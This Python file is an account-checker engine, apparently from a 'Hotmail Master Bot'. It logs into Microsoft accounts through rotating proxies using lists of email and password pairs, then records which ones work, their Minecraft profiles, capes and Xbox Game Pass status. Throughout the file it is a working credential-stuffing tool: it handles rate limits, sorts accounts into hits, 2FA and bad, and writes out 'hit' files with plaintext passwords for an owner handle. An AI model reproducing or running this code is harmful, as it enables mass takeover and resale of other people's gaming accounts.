"""
Minecraft / Xbox Game Pass Checker Engine
Based on official_fixed.py logic | Integrated into Hotmail Master Bot
"""
import re
import json
import time
import random
import requests
import threading
from datetime import datetime
from typing import Dict, List, Tuple, Optional

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass


# ─── Proxy helpers ───────────────────────────────────────────────────────────

_px_lock = threading.Lock()
_px_idx = 0
_dead_px: set = set()


def _proxy_str_to_requests(p: str) -> Optional[dict]:
    if not p:
        return None
    try:
        if p.startswith("socks5://") or p.startswith("socks5h://") or p.startswith("socks4://"):
            return {"http": p, "https": p}
        parts = p.split(":")
        if len(parts) == 4:
            url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            url = f"http://{parts[0]}:{parts[1]}"
        else:
            url = p if p.startswith("http") or p.startswith("socks") else f"http://{p}"
        return {"http": url, "https": url}
    except:
        return None


_px_raw = {}  # proxy-url -> raw "ip:port" string (for dead tracking)
_rl_pause_until = 0  # #9 rate-limit pause timestamp


def _wait_if_paused():
    """#9 — rate-limit pause active ho to wait karo"""
    import time as _t
    remaining = _rl_pause_until - _t.time()
    if remaining > 0:
        _t.sleep(min(remaining, 30))


def _next_proxy(proxies_list: List[str]) -> Optional[dict]:
    global _px_idx, _dead_px
    if not proxies_list:
        return None
    with _px_lock:
        attempts = 0
        while attempts < len(proxies_list) * 2:
            p = proxies_list[_px_idx % len(proxies_list)]
            _px_idx += 1
            attempts += 1
            if p not in _dead_px:
                d = _proxy_str_to_requests(p)
                if d:
                    _px_raw[d["http"]] = p
                return d
        _dead_px.clear()
        p = proxies_list[_px_idx % len(proxies_list)]
        _px_idx += 1
        d = _proxy_str_to_requests(p)
        if d:
            _px_raw[d["http"]] = p
        return d


def _mark_dead(proxy_dict: Optional[dict]):
    if proxy_dict:
        with _px_lock:
            url = proxy_dict.get("http", "")
            raw = _px_raw.get(url, url)
            if raw:
                _dead_px.add(raw)


# ─── Minecraft Checker ───────────────────────────────────────────────────────

class MinecraftChecker:
    """Minecraft / Xbox Game Pass Account Checker"""

    def __init__(self):
        self.sFTTag_url = (
            "https://login.live.com/oauth20_authorize.srf?"
            "client_id=00000000402B5328&"
            "redirect_uri=https://login.live.com/oauth20_desktop.srf&"
            "scope=service::user.auth.xboxlive.com::MBI_SSL&"
            "display=touch&response_type=token&locale=en"
        )

    def _get_urlPost_sFTTag(self, session: requests.Session, proxy: Optional[dict]) -> Tuple[Optional[str], Optional[str]]:
        """Get URL post and sFTTag from Microsoft login"""
        try:
            r = session.get(self.sFTTag_url, proxies=proxy, verify=False, timeout=15)
            if r.status_code != 200:
                return None, None

            text = r.text

            # New Microsoft page format: "urlPost":"https://..." (JSON-style)
            urlPost = None
            m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', text)
            if m:
                urlPost = m.group(1).replace('\\u0026', '&').replace('\\/', '/')
            if not urlPost:
                m = re.search(r'''urlPost:\s*['"]([^'"]+)['"]''', text)
                if m:
                    urlPost = m.group(1)

            # sFTTag: "sFTTag":"<input ... value=\\"TOKEN\\" ..."
            sFTTag = None
            m = re.search(r'sFTTag.*?value=\\+"([^"\\]+)', text)
            if m:
                sFTTag = m.group(1)
            if not sFTTag:
                m = re.search(r'''sFTTag:\s*['"]([^'"]+)['"]''', text)
                if m:
                    sFTTag = m.group(1)
            if not sFTTag:
                m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', text)
                if m:
                    sFTTag = m.group(1)

            return urlPost, sFTTag
        except:
            return None, None

    def _get_xbox_rps(self, session: requests.Session, email: str, password: str, 
                      urlPost: str, sFTTag: str, proxy: Optional[dict]) -> Tuple[Optional[str], Optional[str]]:
        """Authenticate and get Xbox RPS token"""
        try:
            data = {
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": sFTTag
            }

            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
            }

            # MSMC-style: redirects follow karke final URL fragment se token
            from urllib.parse import urlparse, parse_qs

            def _do_post(ppft):
                return session.post(urlPost, data={
                    "login": email, "loginfmt": email, "passwd": password, "PPFT": ppft
                }, headers=headers, proxies=proxy, verify=False,
                    timeout=(5, 12), allow_redirects=True)

            r = _do_post(sFTTag)
            txt = r.text

            # PPFT stale tha to login form wapas aaya — fresh token se 1 retry
            if "PPFT" in txt and "access_token" not in r.url:
                new_url, new_ppft = self._get_urlPost_sFTTag(session, proxy)
                if new_ppft:
                    if new_url:
                        urlPost = new_url
                    r = _do_post(new_ppft)
                    txt = r.text

            # 1) Success — final URL ke fragment mein access_token
            if '#' in r.url and r.url != self.sFTTag_url:
                token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
                if token:
                    return token, None

            # 2) Recovery interstitial (cancel?mkt=) — VALID account, extra step
            if 'cancel?mkt=' in txt:
                try:
                    ipt = re.search(r'(?<="ipt" value=").+?(?=">)', txt).group()
                    pprid = re.search(r'(?<="pprid" value=").+?(?=">)', txt).group()
                    uaid = re.search(r'(?<="uaid" value=").+?(?=">)', txt).group()
                    action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', txt).group()
                    ret = session.post(action, data={'ipt': ipt, 'pprid': pprid, 'uaid': uaid},
                                       headers=headers, proxies=proxy, verify=False,
                                       timeout=(5, 12), allow_redirects=True)
                    rec = re.search(r'(?<="recoveryCancel":\{"returnUrl":").+?(?=",)', ret.text)
                    if rec:
                        fin = session.get(rec.group(), headers=headers, proxies=proxy,
                                          verify=False, timeout=(5, 12), allow_redirects=True)
                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', [None])[0]
                        if token:
                            return token, None
                except Exception:
                    pass

            # 3) 2FA / checkpoint markers (MSMC exact) — account VALID hai
            twofa_markers = ["recover?mkt", "account.live.com/identity/confirm?mkt",
                             "Email/Confirm?mkt", "/Abuse?mkt=", "proofs",
                             "two-factor", "unusual activity"]
            if any(m in txt for m in twofa_markers):
                return None, "2FA"

            # 3.5) Rate-limit / temporary lock — VALID account, proxy change karke retry
            if "tried to sign in too many times" in txt.lower() or "too many requests" in txt.lower():
                # ── #9 Auto-pause: Microsoft rate-limit pe sab threads 25s ruko ──
                global _rl_pause_until
                import time as _t
                with _px_lock:
                    _rl_pause_until = _t.time() + 25
                return None, "ERROR"

            # 4) BAD markers (MSMC exact) — definitely wrong password/account
            bad_markers = ["password is incorrect", "account doesn't exist",
                           "account doesn\\'t exist",
                           "sign in to your microsoft account"]
            if any(m in txt.lower() for m in bad_markers):
                return None, "BAD"

            # 5) Unknown page — proxy/rate issue ho sakta hai, BAD mat maano
            return None, "ERROR"
        except:
            return None, "ERROR"

    def _xbl_auth(self, session: requests.Session, rps_token: str,
                  proxy: Optional[dict]) -> Tuple[Optional[str], Optional[str]]:
        """XBL user authenticate → (xbl_token, uhs)"""
        try:
            data = {
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": f"d={rps_token}"
                },
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT"
            }
            r = session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json=data, proxies=proxy, verify=False, timeout=15,
                headers={"Content-Type": "application/json", "Accept": "application/json"}
            )
            if r.status_code == 200:
                j = r.json()
                uhs = j.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
                return j.get("Token"), uhs
            return None, None
        except:
            return None, None

    def _xsts_authorize(self, session: requests.Session, xbl_token: str,
                        proxy: Optional[dict]) -> Tuple[Optional[str], Optional[str]]:
        """XSTS authorize for Minecraft → (xsts_token, uhs)"""
        try:
            data = {
                "Properties": {
                    "SandboxId": "RETAIL",
                    "UserTokens": [xbl_token]
                },
                "RelyingParty": "rp://api.minecraftservices.com/",
                "TokenType": "JWT"
            }
            r = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json=data, proxies=proxy, verify=False, timeout=15,
                headers={"Content-Type": "application/json", "Accept": "application/json"}
            )
            if r.status_code == 200:
                j = r.json()
                uhs = j.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
                return j.get("Token"), uhs
            return None, None
        except:
            return None, None

    def _xbl_profile(self, session: requests.Session, uhs: str, xbl_token: str,
                     proxy: Optional[dict]) -> dict:
        """Xbox profile — gamertag, locale (region), tenure, account tier"""
        out = {"gamertag": "N/A", "region": "N/A", "tenure": "N/A", "account_tier": "N/A"}
        try:
            r = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings",
                params={"settings": "Gamertag,Locale,TenureLevel,AccountTier"},
                headers={
                    "Authorization": f"XBL3.0 x={uhs};{xbl_token}",
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                },
                proxies=proxy, verify=False, timeout=12
            )
            if r.status_code == 200:
                users = r.json().get("profileUsers", [])
                if users:
                    s = {x.get("id"): x.get("value") for x in users[0].get("settings", [])}
                    out["gamertag"] = s.get("Gamertag", "N/A")
                    out["region"] = s.get("Locale", "N/A")
                    out["tenure"] = s.get("TenureLevel", "N/A")
                    out["account_tier"] = s.get("AccountTier", "N/A")
        except Exception:
            pass
        return out

    def _xgp_expiry(self, session: requests.Session, uhs: str, xbl_token: str,
                    proxy: Optional[dict]) -> str:
        """Game Pass expiry date — best effort via subscriptions endpoint"""
        try:
            r = session.get(
                "https://subscriptions.xboxlive.com/subscriptions",
                headers={
                    "Authorization": f"XBL3.0 x={uhs};{xbl_token}",
                    "x-xbl-contract-version": "1",
                    "Accept": "application/json",
                },
                proxies=proxy, verify=False, timeout=12
            )
            if r.status_code == 200:
                data = r.json()
                items = data if isinstance(data, list) else data.get("subscriptions", data.get("value", []))
                best = None
                for it in (items or []):
                    if not isinstance(it, dict):
                        continue
                    title = str(it.get("offerTitle", it.get("productTitle", ""))).lower()
                    if "game pass" in title or "gamepass" in title:
                        exp = it.get("expirationDate") or it.get("endDate") or it.get("expiryDate")
                        if exp:
                            exp = str(exp)[:10]
                            if best is None or exp > best:
                                best = exp
                if best:
                    return best
        except Exception:
            pass
        return "N/A"

    def _mc_token(self, session: requests.Session, uhs: str, xsts_token: str, 
                  proxy: Optional[dict]) -> Optional[str]:
        """Get Minecraft access token"""
        try:
            data = {
                "identityToken": f"XBL3.0 x={uhs};{xsts_token}"
            }

            r = session.post(
                "https://api.minecraftservices.com/authentication/login_with_xbox",
                json=data, proxies=proxy, verify=False, timeout=15
            )

            if r.status_code == 200:
                return r.json().get("access_token")
            return None
        except:
            return None

    def _checkmc(self, session: requests.Session, email: str, password: str, 
                 token: str, proxy: Optional[dict]) -> Tuple[bool, dict]:
        """Check Minecraft account details"""
        try:
            headers = {"Authorization": f"Bearer {token}"}

            # Get profile
            r = session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers=headers, proxies=proxy, verify=False, timeout=15
            )

            if r.status_code == 200:
                data = r.json()

                capes_list = data.get("capes", [])
                cape_names = [c.get("alias", c.get("id", "?")) for c in capes_list if isinstance(c, dict)]

                info = {
                    "email": email,
                    "password": password,
                    "name": data.get("name", "N/A"),
                    "uuid": data.get("id", "N/A"),
                    "capes": len(capes_list),
                    "cape_names": cape_names,
                    "type": "Minecraft Premium",
                    "skin": data.get("skins", [{}])[0].get("url", "N/A") if data.get("skins") else "N/A"
                }

                # Check for Xbox Game Pass
                try:
                    xbox_r = session.get(
                        "https://xsts.auth.xboxlive.com/xsts/authorize",
                        headers={"Authorization": f"Bearer {token}"},
                        proxies=proxy, verify=False, timeout=10
                    )
                    if xbox_r.status_code == 200:
                        info["xbox"] = "Linked"
                except:
                    info["xbox"] = "Unknown"

                return True, info

            return False, {}
        except:
            return False, {}

    def _check_entitlements(self, session: requests.Session, mc_token: str,
                            proxy: Optional[dict]) -> Tuple[bool, str, bool]:
        """
        Minecraft entitlements se Game Pass detect.
        Returns: (has_xgp, xgp_type, owns_minecraft)
        xgp_type: "XGPU" (Ultimate), "XGP" (PC/Console), "None"
        """
        # MSMC-style: exact product names + 429 retry
        for attempt in range(3):
            try:
                r = session.get(
                    "https://api.minecraftservices.com/entitlements/mcstore",
                    headers={"Authorization": f"Bearer {mc_token}"},
                    proxies=proxy, verify=False, timeout=(5, 10)
                )
                if r.status_code == 429:
                    import time as _t
                    _t.sleep(2)
                    continue
                if r.status_code != 200:
                    return False, "Unknown", False

                text = r.text
                owns_mc = '"product_minecraft"' in text

                if "product_game_pass_ultimate" in text:
                    return True, "XGPU", owns_mc
                if "product_game_pass_pc" in text or "product_game_pass_console" in text:
                    return True, "XGP", owns_mc

                # MSMC "Other" category: Bedrock / Legends / Dungeons
                others = []
                if "product_minecraft_bedrock" in text:
                    others.append("Minecraft Bedrock")
                if "product_legends" in text:
                    others.append("Minecraft Legends")
                if "product_dungeons" in text:
                    others.append("Minecraft Dungeons")
                if others:
                    return False, "Other: " + ", ".join(others), owns_mc

                return False, "None", owns_mc
            except Exception:
                if attempt == 2:
                    return False, "Unknown", False
        return False, "Unknown", False

    def _check_xgp(self, session: requests.Session, token: str, proxy: Optional[dict]) -> Tuple[bool, str]:
        """Check Xbox Game Pass subscription"""
        try:
            headers = {"Authorization": f"Bearer {token}"}

            r = session.get(
                "https://xboxlive.com/en-US/xbox-game-pass",
                headers=headers, proxies=proxy, verify=False, timeout=10
            )

            text = r.text.lower()

            if "game pass ultimate" in text or "xgpu" in text:
                return True, "XGPU"
            elif "game pass" in text or "xgp" in text:
                return True, "XGP"

            return False, "None"
        except:
            return False, "Unknown"

    def check_account(self, email: str, password: str, proxies_list: List[str]) -> Tuple[str, Optional[dict]]:
        """
        Check Minecraft/Xbox account
        Returns: (status, info_dict)
        status: "HIT", "2FA", "BAD", "ERROR"
        """
        # Retry with a fresh proxy on network-level failures (dead proxy / timeout /
        # rate-limit). BAD / 2FA are returned immediately — never retried.
        max_attempts = 3 if proxies_list else 1
        for _attempt in range(max_attempts):
            _wait_if_paused()
            px = _next_proxy(proxies_list) if proxies_list else None
            try:
                session = requests.Session()

                # Step 1: Get sFTTag
                urlPost, sFTTag = self._get_urlPost_sFTTag(session, px)
                if not urlPost or not sFTTag:
                    _mark_dead(px)
                    continue

                # Step 2: Login
                access_token, status = self._get_xbox_rps(session, email, password, urlPost, sFTTag, px)

                if status == "2FA":
                    return "2FA", None
                if status == "BAD":
                    return "BAD", None
                if not access_token:
                    _mark_dead(px)
                    continue

                # Step 3: XBL auth (RPS token → Xbox token)
                xbl_token, uhs = self._xbl_auth(session, access_token, px)
                if not xbl_token:
                    _mark_dead(px)
                    continue

                # Step 3.5: Xbox profile — gamertag / region / tenure (for all HIT types)
                xprof = self._xbl_profile(session, uhs, xbl_token, px)

                # Step 4: XSTS authorize (for Minecraft services)
                xsts_token, uhs2 = self._xsts_authorize(session, xbl_token, px)
                if not xsts_token:
                    # Login valid but XSTS blocked (e.g. child account / region)
                    info = {"email": email, "password": password, "name": "N/A",
                            "uuid": "N/A", "capes": 0, "cape_names": [], "type": "Valid Login (XSTS blocked)",
                            "skin": "N/A", "xgp": "Unknown", "has_xgp": False, **xprof}
                    return "HIT", info

                # Step 5: Minecraft token
                mc_token = self._mc_token(session, uhs2 or uhs, xsts_token, px)
                if not mc_token:
                    _mark_dead(px)
                    continue

                # Step 6: Game Pass / ownership via entitlements
                has_xgp, xgp_type, owns_mc = self._check_entitlements(session, mc_token, px)

                # Step 6.5: Game Pass expiry (best effort)
                xgp_exp = self._xgp_expiry(session, uhs, xbl_token, px) if has_xgp else "N/A"

                # Step 7: Check Minecraft profile
                success, info = self._checkmc(session, email, password, mc_token, px)

                if success:
                    info["xgp"] = xgp_type
                    info["has_xgp"] = has_xgp
                    info["xgp_expiry"] = xgp_exp
                    info.update(xprof)
                    return "HIT", info

                # Login valid but no Minecraft profile — Game Pass / Other / plain valid
                if has_xgp:
                    acct_type = "Game Pass Account"
                elif xgp_type.startswith("Other:"):
                    acct_type = xgp_type  # Bedrock/Legends/Dungeons
                else:
                    acct_type = "Valid Login (No Minecraft)"
                info = {"email": email, "password": password, "name": "N/A",
                        "uuid": "N/A", "capes": 0, "cape_names": [], "type": acct_type,
                        "skin": "N/A", "xgp": xgp_type, "has_xgp": has_xgp,
                        "xgp_expiry": xgp_exp, **xprof}
                return "HIT", info

            except requests.exceptions.ProxyError:
                _mark_dead(px)
                continue
            except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError,
                    requests.exceptions.ReadTimeout, requests.exceptions.SSLError):
                _mark_dead(px)
                continue
            except Exception:
                continue

        # All proxies failed — genuine error
        return "ERROR", None


def format_hit_minecraft(info: dict, source: str) -> Tuple[str, str]:
    """Format Minecraft hit output"""
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    xgp_badge = "💎 XGPU" if info.get("xgp") == "XGPU" else ("💎 XGP" if info.get("has_xgp") else "🆓 No XGP")
    cape_names = info.get("cape_names") or []
    capes_line = ("\n  Cape List : " + ", ".join(cape_names)) if cape_names else ""

    content = f"""════════════════════════════════════════════════════════
  WHITE Xbox Game Pass Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Email     : {info.get('email', 'N/A')}
  Password  : {info.get('password', 'N/A')}
  Name      : {info.get('name', 'N/A')}
  Gamertag  : {info.get('gamertag', 'N/A')}
  UUID      : {info.get('uuid', 'N/A')}
  Type      : {info.get('type', 'N/A')}
  Region    : {info.get('region', 'N/A')}
  Tenure    : {info.get('tenure', 'N/A')}
  Tier      : {info.get('account_tier', 'N/A')}
  Capes     : {info.get('capes', 0)}{capes_line}
  Xbox      : {info.get('xbox', 'Unknown')}
  Game Pass : {xgp_badge}
  XGP Expiry: {info.get('xgp_expiry', 'N/A')}
  Skin      : {info.get('skin', 'N/A')}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE Xbox Game Pass Checker
════════════════════════════════════════════════════════
"""
    safe_name = re.sub(r'[<>:"/\|?*\s]', '_', info.get("name", "unknown"))
    filename = f"[mc_{safe_name}].txt"
    return content, filename
